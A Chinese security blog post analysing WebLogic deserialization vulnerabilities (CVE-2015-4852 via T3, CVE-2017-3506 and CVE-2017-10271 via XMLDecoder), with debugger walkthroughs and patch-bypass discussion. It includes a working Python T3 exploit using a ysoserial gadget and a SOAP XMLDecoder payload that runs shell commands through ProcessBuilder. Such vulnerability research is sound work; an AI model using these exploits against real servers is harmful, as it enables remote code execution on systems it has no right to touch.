<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>浅析Weblogic 反序列化漏洞 - ConsT27's Blog</title>
    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\u6d45\u6790Weblogic \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u76ee\u5f55", url: "#_1" },
              {title: "T3\u534f\u8bae", url: "#t3" },
              {title: "XMLDecoder", url: "#xmldecoder" },
          ]},
        ];

    </script>
    <script src="../../../../../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../../shiro/shiro/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../../shiro/shiro/" class="btn btn-xs btn-link">
        shiro
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Weblogic/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Weblogic/" class="btn btn-xs btn-link">
        Weblogic
      </a>
    </div>
    
  </div>

    

    <h1 id="weblogic">浅析Weblogic 反序列化漏洞</h1>
<h2 id="_1">目录</h2>
<ul>
<li><a href="#T3协议">T3协议</a><ul>
<li><a href="#抓包分析">抓包分析</a></li>
<li><a href="#CVE-2015-4852">CVE-2015-4852</a><ul>
<li><a href="#分析">分析</a></li>
<li><a href="#resolveClass">resolveClass</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#XMLDecoder">XMLDecoder</a><ul>
<li><a href="#apache-xerces">apache xerces</a></li>
<li><a href="#DocumentHandler">DocumentHandler</a><ul>
<li><a href="#工作原理">工作原理</a></li>
</ul>
</li>
<li><a href="#Demo调试">Demo调试</a><ul>
<li><a href="#readObject">readObject</a></li>
<li><a href="#ScanDocument">ScanDocument</a></li>
<li><a href="#总结">总结</a></li>
</ul>
</li>
<li><a href="#CVE-2017-3506CVE-2017-10271">CVE-2017-3506\&amp;CVE-2017-10271</a></li>
</ul>
</li>
</ul>
<hr />
<p>先引用一下奇安信团队发出的weblogic历史漏洞图，可以发现以反序列化为主，反序列化问题主要来自XMLDecoder和T3协议</p>
<p><img alt="image-20211105215405027" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105215405027.png" title="image-20211105215405027" /></p>
<h2 id="t3">T3协议</h2>
<p>weblogic t3协议就是weblogic的rmi所使用的协议。
在传统java中，rmi使用的是jrmp协议。</p>
<p>JRMP协议的通信由如下部分构成</p>
<pre><code class="language-纯文本">客户端对象
服务端对象
客户端代理对象（stub）
服务端代理对象（skeleton）
</code></pre>
<p><img alt="QQ截图20210219152334" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219152334.png" title="QQ截图20210219152334" /></p>
<p>而T3协议在JRMP协议上做出了改进，stub和skeleton都是动态生成的，将对象部署到RMI注册中心时weblogic会自动生成stub和skeleton。</p>
<p>Weblogic之所以开发T3协议，是因为他们需要可扩展，高效的协议来使用Java构建企业级的分布式对象系统</p>
<h3 id="_2">抓包分析</h3>
<p>我们想抓包分析T3协议有两个方法
1.写一个T3 rmi server和一个T3 rmi client，启动client去请求rmi server，从而实现抓包，这个方法的详细步骤在这篇文章中<a href="https://hu3sky.github.io/2020/03/20/weblogic%20t3%20%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/#%E5%AE%9E%E7%8E%B0%E6%AD%A3%E5%B8%B8t3%E7%B1%BB%E7%9A%84%E8%B0%83%E7%94%A8" title="https://hu3sky.github.io/2020/03/20/weblogic%20t3%20%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/#%E5%AE%9E%E7%8E%B0%E6%AD%A3%E5%B8%B8t3%E7%B1%BB%E7%9A%84%E8%B0%83%E7%94%A8">https://hu3sky.github.io/2020/03/20/weblogic%20t3%20%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/#%E5%AE%9E%E7%8E%B0%E6%AD%A3%E5%B8%B8t3%E7%B1%BB%E7%9A%84%E8%B0%83%E7%94%A8</a></p>
<p>2.使用python模拟client发包，从而实现T3协议抓包分析。这个实现起来比较容易，我们就通过该方法来一窥T3协议的奥妙。
<a href="https://xz.aliyun.com/t/10365#toc-1环境的搭建在这篇文章中，这里不再赘述。" title="https://xz.aliyun.com/t/10365#toc-1环境的搭建在这篇文章中，这里不再赘述。">https://xz.aliyun.com/t/10365#toc-1环境的搭建在这篇文章中，这里不再赘述。</a></p>
<p>在完成环境搭建后，我们使用如下exp</p>
<pre><code class="language-纯文本">from os import popen
import struct # 负责大小端的转换
import subprocess
from sys import stdout
import socket
import re
import binascii

def generatePayload(gadget,cmd):
    YSO_PATH = &quot;E:\\tools\\java\\ysoserial-master-d367e379d9-1.jar&quot;
    popen = subprocess.Popen(['java','-jar',YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)
    return popen.stdout.read()

def T3Exploit(ip,port,payload):
    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((ip,port))
    handshake = &quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;
    sock.sendall(handshake.encode())
    data = sock.recv(1024)
    compile = re.compile(&quot;HELO:(.*).0.false&quot;)
    match = compile.findall(data.decode())
    if match:
        print(&quot;Weblogic: &quot;+&quot;&quot;.join(match))
    else:
        print(&quot;Not Weblogic&quot;)
        #return
    header = binascii.a2b_hex(b&quot;00000000&quot;)
    t3header = binascii.a2b_hex(b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;)
    desflag = binascii.a2b_hex(b&quot;fe010000&quot;)
    payload = header + t3header  +desflag+  payload
    payload = struct.pack(&quot;&gt;I&quot;,len(payload)) + payload[4:]
    sock.send(payload)

if __name__ == &quot;__main__&quot;:
    ip = &quot;127.0.0.1&quot;
    port = 7001
    gadget = &quot;CommonsCollections1&quot;
    cmd = &quot;touch /tmp/hack&quot;
    payload = generatePayload(gadget,cmd)
    T3Exploit(ip,port,payload)
</code></pre>
<p>指定端口和IP后，可以通过以下指令来看是否攻击成功</p>
<pre><code class="language-纯文本">docker exec  weblogic1036jdk7u21 ls tmp/
</code></pre>
<p>我们通过抓取相关流量包来一窥T3协议，wireshark设置tcp.port==7001，执行以上脚本，抓取T3流量</p>
<p><img alt="image-20211031185642616" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031185642616.png" title="image-20211031185642616" /></p>
<p>发送的第一个包为T3协议头，t3后面接的使weblogic客户端版本</p>
<p><img alt="image-20211031185839574" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031185839574.png" title="image-20211031185839574" /></p>
<p>服务器会返回应答，并在HELO 后接weblogic服务端版本，利用这个特性可以刺探weblogic服务器版本</p>
<p><img alt="image-20211031190051255" src="C:\Users\14216\AppData\Roaming\Typora\typora-user-images\image-20211031190051255.png" title="image-20211031190051255" /></p>
<p>接下来客户端会发送一个相对比较大的数据包，其内容分析如下</p>
<p><img alt="image-20211031204848507" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031204848507.png" title="image-20211031204848507" /></p>
<p>数据包仅为蓝色部分的内容，第一个框中是数据包的长度，第二个框是反序列化标志，两个框中间是T3协议头，剩下的便是序列化数据。</p>
<p>T3协议发送序列化数据时有时候并不只发送一段序列化数据，它可能会发送多个序列化数据，彼此之间以反序列化标志隔开，就像这样</p>
<p><img alt="image-20211031210027329" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031210027329.png" title="image-20211031210027329" /></p>
<h3 id="cve-2015-4852">CVE-2015-4852</h3>
<p>漏洞版本</p>
<blockquote>
<p>10.3.6.0, 12.1.2.0, 12.1.3.0, and 12.2.1.0</p>
</blockquote>
<p>上面的exp就是哪来打这个洞的，上述CVE版本没有对T3反序列化安全问题做任何防范，利用T3协议反序列化CC链。jdk1.7，weblogic10.3.6.0 用cc链1，3，6都能打。</p>
<p>这个洞可以说是weblogic反序列化漏洞的源头了。</p>
<h4 id="_3">分析</h4>
<p><strong>weblogic.rjvm.InboundMsgAbbrev#readObject</strong></p>
<p>作为入口的readObject方法就在此处，在此中调用了InboundMsgAbbrev.ServerChannelInputStream的readObject方法，var1即是序列化后的数据，我们进行一个跟进</p>
<p><img alt="image-20211031213830584" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031213830584.png" title="image-20211031213830584" /></p>
<p><strong>InboundMsgAbbrev.ServerChannelInputStream#readObject</strong></p>
<p>跟进后发现此类继承自ObjectInputStream且未重写readObject方法
也就是说序列化数据传入后直接以参数的形式传入了ObjectInputStream对象，并调用了其readObject方法。
于是便畅通无阻的触发了反序列化漏洞</p>
<p><img alt="image-20211031215946437" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031215946437.png" title="image-20211031215946437" /></p>
<h4 id="resolveclass">resolveClass</h4>
<p>这里之所以要说一下resolveClass，是因为网上很多T3反序列化相关文章都提了这个东西，也是我之前不知道的一个东西，所以便记录一下。</p>
<p>resolveClass是ObjectInputStream.readObject()中必经的一个方法，也就是说在反序列化过程中，序列化的数据都会从resolveClass这个方法中经过一次。</p>
<p>这个方法的作用是类的序列化描述符加工成该类的Class对象，很多针对反序列化Gadget的拦截都是通过重写此方法完成的（如通过黑名单来禁止某类反序列化）</p>
<p><img alt="image-20211101162703325" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211101162703325.png" title="image-20211101162703325" /></p>
<p>贴上一张廖师傅的博客的反序列化攻击时序图：
可以看到反序列化拦截位置除了resolveClass以外还有一个resolveProxyClass，它用于返回实现了代理类描述符中所有接口的代理类，这里不对该方法展开叙述，它也可以被用作反序列化攻击的拦截</p>
<p><img alt="image-20211101134646925" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211101134646925.png" title="image-20211101134646925" /></p>
<p>上文在分析CVE-2015-4852时，InboundMsgAbbrev.ServerChannelInputStream类重写了resolveClass，如果重写得当那么就可以起到缓解反序列化漏洞的作用，可惜这个类直接调用了父类的resolveClass</p>
<p><img alt="image-20211101162325788" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211101162325788.png" title="image-20211101162325788" /></p>
<h2 id="xmldecoder">XMLDecoder</h2>
<p>XMLDecoder是一套用于对XML进行序列化或反序列化的一套API，它在JDK1.4就已经被开发了出来，它对XML的解析模式并不是更为人所知的DOM解析，而是SAX解析。
DOM解析在解析XML时会读取所有数据然后生成DOM树来解析，而SAX则是线性读取XML，所以SAX解析XML性能消耗相对较小。</p>
<p><img alt="image-20211102152704874" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102152704874.png" title="image-20211102152704874" /></p>
<h3 id="apache-xerces">apache xerces</h3>
<p>apache xerces是XMLDecoder解析XML时的一个重要组件。
apache xerces是一个用于解析XML中有哪些标签，语法是否合法的解析器，官方在JDK1.5便集成了此解析器并作为XML的默认解析器。</p>
<p>在XML序列化数据传达至XMLDecoder.readObject() 方法进行反序列化等操作后，便会传递给xerces进行解析，在xerces解析完毕后数据便会交给DocumentHandler完成后续的操作，如果是JDK1.6便会交给ObjectHandler进行处理。</p>
<h3 id="documenthandler">DocumentHandler</h3>
<p>DocumentHandler（com.sun.beans.decoder.DocumentHandler）在XMLDecoder处理XML数据时起到事件处理器的作用，它在JDK1.7中被实现。
它会跟进传入的XML标签，属性等信息调用不同的Handler进行事件处理
我们针对XMLDecoder的反序列化攻击便是传入特定的XML序列化数据由DocumentHandler进行事件处理，进而实现RCE等攻击。</p>
<p>下图是jdk1.7 DocumentHandler中所定义的各种标签的处理办法。</p>
<p><img alt="image-20211102154241440" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102154241440.png" title="image-20211102154241440" /></p>
<p>JDK1.6中也有个和DocumentHandler功能类似的ObjectHandler，但是它实现的标签远少于DocumentHandler，且远不如其规范化。下图是ObjectHandler的部分代码。</p>
<p>“值得注意的是CVE-2019-2725的补丁绕过其中有一个利用方式就是基于JDK1.6。”</p>
<p><img alt="image-20211102154904139" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102154904139.png" title="image-20211102154904139" /></p>
<p>下面举例一下各标签的作用</p>
<p><strong>string</strong></p>
<p>\<string>aaa\</string></p>
<p>的意思就是表示一段值为aaa的字符串，这个标签一般与其他标签一起用来达到一些效果</p>
<p><strong>object</strong></p>
<p>object标签表示一个对象，其class属性指定类名，method属性指定某方法名（构造方法方法名为new）</p>
<p>如 new A("test"); 的xml文档表现为</p>
<pre><code class="language-纯文本">&lt;object class=&quot;A&quot; method=&quot;new&quot;&gt;
  &lt;string&gt;test&lt;/string&gt;
&lt;/object&gt;
</code></pre>
<p><strong>void</strong></p>
<p>void一般与其他标签搭配使用，它也有method，class等属性，于是它和object标签十分相像。</p>
<p>void一般用于函数调用并通过method属性指定方法名，以及其他辅助作用（如array标签中充当索引）</p>
<p>如A a = new A(); A.foo("test"); 的xml文档表现为</p>
<pre><code class="language-纯文本">&lt;object class=&quot;A&quot;&gt;
    &lt;void method=&quot;foo&quot;&gt;
    &lt;string&gt;test&lt;/string&gt;
    &lt;/void&gt;
&lt;/object&gt;
</code></pre>
<p><strong>array</strong></p>
<p>array标签用于表示数组，class属性指定类名，内部通过void标签的index属性设置索引</p>
<p>如 String[] a = new String[];s[1]="test" 的xml表现形式为</p>
<pre><code class="language-纯文本">&lt;array class=&quot;java.lang.String&quot;&gt;
    &lt;void index=&quot;1&quot;&gt;
    &lt;string&gt;test&lt;/string&gt;
  &lt;/void&gt;
&lt;/array&gt;
</code></pre>
<h4 id="_4">工作原理</h4>
<p>不同的XML标签对应着不同的handler，也就对应着不同的处理机制。
大多数handler都有addAttribute方法，这个方法主要用于提取标签中的属性并进行处理；
以及getValueObject方法，这个方法主要用于获取标签的值。</p>
<p>首先以java标签为例：var1对应着属性名，var2对应着属性值。java标签会根据class属性中的值进行类加载。</p>
<p><img alt="image-20211102162202707" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102162202707.png" title="image-20211102162202707" /></p>
<p>再来看看New标签：和java标签的handler类似，它也会进行类加载操作，不过NewElementHandler是许多handler的父类（如ArrayElementHandler，ObjectElementHandler），这就意味着NewElementHandler的子类也可以进行类加载</p>
<p><img alt="image-20211102162638378" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102162638378.png" title="image-20211102162638378" /></p>
<p>在上文中提到object标签有进行类加载的能力，是因为其class属性是由父类NewElementHandler进行处理的。</p>
<p><img alt="image-20211103141517211" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103141517211.png" title="image-20211103141517211" /></p>
<p>而void标签之所以和object标签如此相像的原因是，VoidElementHandler继承自ObjectElementHandler，且仅重写了一个isArgument方法，其它都和父类一样。</p>
<p><img alt="image-20211103141611207" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103141611207.png" title="image-20211103141611207" /></p>
<p>再来看看array，它也是一个很重要的标签</p>
<h3 id="demo">Demo调试</h3>
<p>从上文大概知道XMLDecoder处理xml的流程为 :XMLDecoder.readObject() -&gt;xerces解析-&gt;DocumentHandler事件处理，那不如写个Demo调试一下看看具体过程如何</p>
<pre><code class="language-纯文本">import java.beans.XMLDecoder;
import java.io.*;

public class Main {
    public static void main(String[] args) throws FileNotFoundException {
         String s = &quot;&lt;java version=\&quot;1.7.0_80\&quot; class=\&quot;java.beans.XMLDecoder\&quot;&gt;\n&quot; +
                 &quot; &lt;object class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot; +
                 &quot;  &lt;array class=\&quot;java.lang.String\&quot; length=\&quot;1\&quot;&gt;\n&quot; +
                 &quot;    &lt;void index=\&quot;0\&quot;&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/void&gt;\n&quot; +
                 &quot;  &lt;/array&gt;\n&quot; +
                 &quot;  &lt;void method=\&quot;start\&quot;&gt;&lt;/void&gt;\n&quot; +
                 &quot; &lt;/object&gt;\n&quot; +
                 &quot;&lt;/java&gt;&quot;;
        StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(s);
        XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream);
        Object o = xmlDecoder.readObject();
        System.out.println(o);
    }
}
</code></pre>
<p>直接开始动调，在demo中xmlDecoder.readObject() 处下断点。跟进。</p>
<h4 id="readobject">readObject</h4>
<p>跟进readObject,可以发现调用了parsingComplete(),继续跟进</p>
<p><img alt="image-20211103150406152" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103150406152.png" title="image-20211103150406152" /></p>
<p>java.beans.XMLDecoder#parsingComplete, 因为我们跟踪的是对XML的解析过程，所以这个parse方法就很可疑，而且又因为是可跟进的，所以我们对其进行一个跟进</p>
<p><img alt="image-20211103190636095" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103190636095.png" title="image-20211103190636095" /></p>
<p>com.sun.beans.decoder.DocumentHandler#parse,又发现一个parse，跟进</p>
<p><img alt="image-20211103191553843" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103191553843.png" title="image-20211103191553843" /></p>
<p>com.sun.org.apache.xerces.internal.jaxp. SAXParserImpl#parse,又找到一个parse，跟进</p>
<p><img alt="image-20211103191733578" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103191733578.png" title="image-20211103191733578" /></p>
<p>com.sun.org.apache.xerces.internal.jaxp. SAXParserImpl#parse，发现跟进来的这个parse是重载方法，在其中又发现了parse，再跟</p>
<p><img alt="image-20211103191905287" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103191905287.png" title="image-20211103191905287" /></p>
<p>com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser#parse,发现parse，又跟</p>
<p><img alt="image-20211103192132155" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103192132155.png" title="image-20211103192132155" /></p>
<p>com.sun.org.apache.xerces.internal.parsers.XMLParser#parse</p>
<p><img alt="image-20211103192259557" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103192259557.png" title="image-20211103192259557" /></p>
<p>com.sun.org.apache.xerces.internal.parsers. XML11Configuration#parse</p>
<p><img alt="image-20211103192350388" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103192350388.png" title="image-20211103192350388" /></p>
<p>com.sun.org.apache.xerces.internal.parsers. XML11Configuration#parse,上一个parse的重载，其中调用了一个叫scanDocument的方法</p>
<p><img alt="image-20211103195452940" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103195452940.png" title="image-20211103195452940" /></p>
<p>跟进scanDocument，到这里就已经进入了xerces解析了。这里有个do..while循环，作用是提取XML标签</p>
<p><img alt="image-20211104135729090" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104135729090.png" title="image-20211104135729090" /></p>
<p>调用链:</p>
<p><img alt="image-20211104140128888" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104140128888.png" title="image-20211104140128888" /></p>
<h4 id="scandocument">ScanDocument</h4>
<p>我们来看一下scanDocument这个方法。 这里循环执行了next()方法，在前十几个循环里，这个方法对XML进行了解析和事件处理。大致的处理流程是对每一个解析到的标签先实例化对应的handler，然后循环调用addAttribute方法获取其所有属性并进行一定的事件处理，当解析到某个标签的结束标签时(如\</java>) 便会调用getValueObject 获取标签中的值的信息。这里借用一个图</p>
<p><img alt="img" src="https://image.3001.net/images/20200820/1597902334.png!small" title="img" /></p>
<pre><code class="language-纯文本">    public boolean scanDocument(boolean complete) throws IOException, XNIException {
        this.fEntityManager.setEntityHandler(this);
        int event = this.next();

    do {
            switch(event) {
            case 1:
            case 2:
            case 6:
      ..................
       case 12:
                this.fDocumentHandler.startCDATA((Augmentations)null);
                this.fDocumentHandler.characters(this.getCharacterData(), (Augmentations)null);
                this.fDocumentHandler.endCDATA((Augmentations)null);

            event = this.next();
</code></pre>
<p>下面的调试我对XML中所涉及的所有handler的所有方法均下了断点以方便调试。</p>
<p>我们XML中第一个标签是JAVA，于是我们在JavaElementHandler各方法下断点后，可以发现next方法内部会先实例化JavaElementHandler，然后调用addAttribute，将获取的类对象(java.beans.XMLDecoder)置入this。</p>
<p><img alt="image-20211104193157735" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104193157735.png" title="image-20211104193157735" /></p>
<p>然后自然是解析object标签，由于ObjectElementHandler未定义对class属性的解析，所以会调用父类NewElementHandler对其进行解析，将获取的类对象(java.lang.ProcessBuilder)置入this</p>
<p><img alt="image-20211104193433518" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104193433518.png" title="image-20211104193433518" /></p>
<p>就这样 得到标签-&gt;实例化Handler-&gt;循环标签属性进行事件处理  ，直到解析到第一个末标签(EndElement)\</string>,便会执行StringElementHandler#getValueObject，返回被ValueObjectImpl.create处理过的标签内的值。</p>
<p><img alt="image-20211104203042115" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104203042115.png" title="image-20211104203042115" /></p>
<p><img alt="image-20211104203356887" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104203356887.png" title="image-20211104203356887" /></p>
<p>然后接下来会把这个ValueObjectImpl对象赋值到父标签对应的handler的属性里</p>
<p><img alt="image-20211104211811441" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104211811441.png" title="image-20211104211811441" /></p>
<p><img alt="image-20211105025432694" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105025432694.png" title="image-20211105025432694" /></p>
<p>而解析到\<void index="0">\<string>calc\</string>\</void> 的\</void> 时，会根据if逻辑判断这里void标签的作用，这里判断的void起到一个数组元素赋值的作用，于是便通过set方法往Array赋值。</p>
<p><img alt="image-20211105134901622" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105134901622.png" title="image-20211105134901622" /></p>
<p>在解析到\<void method="start">\</void>的末标签\</void>时，它的逻辑是这样的，先获取父handler对应type的实例化对象，然后再对其使用start方法</p>
<p><img alt="image-20211105140017348" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140017348.png" title="image-20211105140017348" /></p>
<p>如果我们跟进这个getContextBean就会来到这里，发现确实是调用链父handler即ObjectElementHandler的getValueObject</p>
<p><img alt="image-20211105140036168" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140036168.png" title="image-20211105140036168" /></p>
<p>跟进看看父handler的getValueObject逻辑，发现确实是返回了一个new ProcessBuilder("calc").  calc字段在var5.argument中，截图中没有截出来。</p>
<p><img alt="image-20211105140436181" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140436181.png" title="image-20211105140436181" /></p>
<p>回到本handler，通过拼接，执行了new ProcessBuilder("calc").start(); 弹出计算器。</p>
<p><img alt="image-20211105140826489" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140826489.png" title="image-20211105140826489" /></p>
<h4 id="_5">总结</h4>
<p>当xml数据传入到XMLDecoder.readObejct后经过一些处理会传入到scanDocument方法里，这个方法会循环解析XML标签并交由相应的Handler进行处理，且子标签的handler对父标签的handler由链表结构串联起来，所以每解析一个标签就会往这个链表结构增添新元素并进行一些事件处理。</p>
<p>从安全方面而言，便是攻击者通过传入恶意XML数据交由XMLDecoder进行解析，XMLDecoder会循环遍历XML数据并进行拼接处理，直到最后拼接出完整的恶意语句并执行。</p>
<h3 id="cve-2017-3506cve-2017-10271">CVE-2017-3506\&amp;CVE-2017-10271</h3>
<p>影响范围</p>
<ul>
<li>WebLogic 10.3.6.0</li>
<li>WebLogic 12.1.3.0</li>
<li>WebLogic 12.2.1.0</li>
<li>WebLogic 12.2.1.1</li>
<li>WebLogic 12.2.1.2</li>
</ul>
<p>该漏洞利用weblogic的wls-wsat组件对XML用XMLDecoder进行解析的功能，从而对其传入恶意XML数据造成反序列化攻击。</p>
<p>复现分析如下</p>
<pre><code class="language-纯文本">[*] wls-wsat组件路径：

            /wls-wsat/CoordinatorPortType
            /wls-wsat/CoordinatorPortType11
            /wls-wsat/ParticipantPortType
            /wls-wsat/ParticipantPortType11
            /wls-wsat/RegistrationPortTypeRPC
            /wls-wsat/RegistrationPortTypeRPC11
            /wls-wsat/RegistrationRequesterPortType
            /wls-wsat/RegistrationRequesterPortType1
</code></pre>
<p>对weblogic路由   <a href="http://xxx:7001/wls-wsat/CoordinatorPortType" title="http://xxx:7001/wls-wsat/CoordinatorPortType">http://xxx:7001/wls-wsat/CoordinatorPortType</a> 发送如下数据包</p>
<pre><code class="language-纯文本">
&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
  &lt;soapenv:Header&gt;
    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
        &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
          &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
            &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
              &lt;void index=&quot;0&quot;&gt;
                &lt;string&gt;/bin/bash&lt;/string&gt;
              &lt;/void&gt;
              &lt;void index=&quot;1&quot;&gt;
                &lt;string&gt;-c&lt;/string&gt;
              &lt;/void&gt;
              &lt;void index=&quot;2&quot;&gt;
                &lt;string&gt;touch /tmp/1234&lt;/string&gt;
              &lt;/void&gt;
            &lt;/array&gt;
          &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
        &lt;/java&gt;
      &lt;/work:WorkContext&gt;
    &lt;/soapenv:Header&gt;
  &lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;
</code></pre>
<p>并修改content-type</p>
<p><img alt="image-20211105162455106" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105162455106.png" title="image-20211105162455106" /></p>
<p>我这里直接在javaElementHandler#addAttribute 下断点然后观察堆栈信息
可以发现是WorkContextXmlInputAdapter#readUTF 处调用了xmlDecoder的readObject方法。我们的XML就这样传进去畅通无阻的进入了XMLDecoder的解析。</p>
<p><img alt="image-20211105153940400" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105153940400.png" title="image-20211105153940400" /></p>
<p>攻击结果</p>
<p><img alt="image-20211105154839248" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105154839248.png" title="image-20211105154839248" /></p>
<p><code>CVE-2017-3506</code>修补方案为采用黑名单机制禁用了object标签，这简直不要太好绕，所以CVE-2017-10271来了。</p>
<p>这是黑名单校验的相关代码。</p>
<pre><code class="language-纯文本">private void validate(InputStream is) {
      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
      try {
         SAXParser parser = factory.newSAXParser();
         parser.parse(is, new DefaultHandler() {
            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
               if(qName.equalsIgnoreCase(&quot;object&quot;)) {
                  throw new IllegalStateException(&quot;Invalid context type: object&quot;);
               }
            }
         });
      } catch (ParserConfigurationException var5) {
         throw new IllegalStateException(&quot;Parser Exception&quot;, var5);
      } catch (SAXException var6) {
         throw new IllegalStateException(&quot;Parser Exception&quot;, var6);
      } catch (IOException var7) {
         throw new IllegalStateException(&quot;Parser Exception&quot;, var7);
      }
   }
</code></pre>
<p>绕过就是把object标签改为void标签就行了，因为从代码层面来看，void和object的handler因为是父子类关系，所以逻辑是高度相同的。</p>
<p>CVE-2017-10271的补丁则是继续把黑名单补全，可见除了object，还有method，new，array等标签都被做了处理。
object，new，method标签直接被ban，void属性只能设置index，array的class只能设置为byte类型。</p>
<pre><code class="language-纯文本">private void validate(InputStream is) {
   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
   try {
      SAXParser parser = factory.newSAXParser();
      parser.parse(is, new DefaultHandler() {
         private int overallarraylength = 0;
         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
            if(qName.equalsIgnoreCase(&quot;object&quot;)) {
               throw new IllegalStateException(&quot;Invalid element qName:object&quot;);
            } else if(qName.equalsIgnoreCase(&quot;new&quot;)) {
